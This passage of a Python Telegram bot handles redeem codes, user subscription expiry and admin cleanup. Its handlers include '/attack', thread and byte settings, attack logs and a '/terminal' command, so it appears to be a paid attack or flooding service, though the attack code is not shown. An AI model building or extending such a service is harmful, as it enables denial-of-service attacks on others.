    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return

    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return

    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return

    # Update the user's expiry date
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    # Mark the redeem code as used by adding user to `used_by`, incrementing `redeem_count`
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

# Function to delete redeem codes based on specified criteria
async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to delete redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    # Check if a specific code is provided as an argument
    if len(context.args) > 0:
        # Get the specific code to delete
        specific_code = context.args[0]

        # Try to delete the specific code, whether expired or not
        result = redeem_codes_collection.delete_one({"code": specific_code})
        
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*⚠️ Code `{specific_code}` not found.*", 
                parse_mode='Markdown'
            )
    else:
        # Delete only expired codes if no specific code is provided
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})

        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ No expired codes found to delete.*", 
                parse_mode='Markdown'
            )

# Function to list redeem codes
async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    print("list_codes function called")  # Debugging statement

    # Check if the user is authorized
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return

    # Check if there are any documents in the collection
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
        return

    # Retrieve all codes
    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code.get('expiry_date')  # Use .get() to avoid KeyError
        if expiry_date is None:
            continue  # Skip if expiry_date is not set

        # Ensure expiry_date is timezone-aware
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)

        # Format expiry date to show only the date (YYYY-MM-DD)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')

        # Calculate the remaining time
        time_diff = expiry_date - current_time
        remaining_minutes = time_diff.total_seconds() // 60  # Get the remaining time in minutes

        # Avoid showing 0.0 minutes, ensure at least 1 minute is displayed
        remaining_minutes = max(1, remaining_minutes)

        # Display the remaining time in a more human-readable format
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"

        # Determine whether the code is valid or expired
        if expiry_date > current_time:
            status = "✅"
        else:
            status = "❌"
            remaining_time = "(Expired)"

        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

# Function to check if a user is allowed
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user.get('expiry_date')  # Safely get expiry_date
        if expiry_date:
            if isinstance(expiry_date, datetime) and expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def cleanup(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to perform this action!*", parse_mode='Markdown')
        return

    # Get the current UTC time
    current_time = datetime.now(timezone.utc)

    # Find users with expired expiry_date
    expired_users = users_collection.find({"expiry_date": {"$lt": current_time}})

    expired_users_list = list(expired_users)  # Convert cursor to list

    if len(expired_users_list) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No expired users found.*", parse_mode='Markdown')
        return

    # Remove expired users from the database
    for user in expired_users_list:
        users_collection.delete_one({"_id": user["_id"]})

    # Notify admin
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Cleanup Complete!*\n*Removed {len(expired_users_list)} expired users.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("argument", set_argument))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("set_time", set_max_attack_time))
    application.add_handler(CommandHandler("log", view_attack_log))  # Add this handler
    application.add_handler(CommandHandler("delete_log", delete_attack_log))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("ls", list_files))
    application.add_handler(CommandHandler("delete", delete_file))
    application.add_handler(CommandHandler("terminal", execute_terminal))

    application.run_polling()

if __name__ == '__main__':
    main()

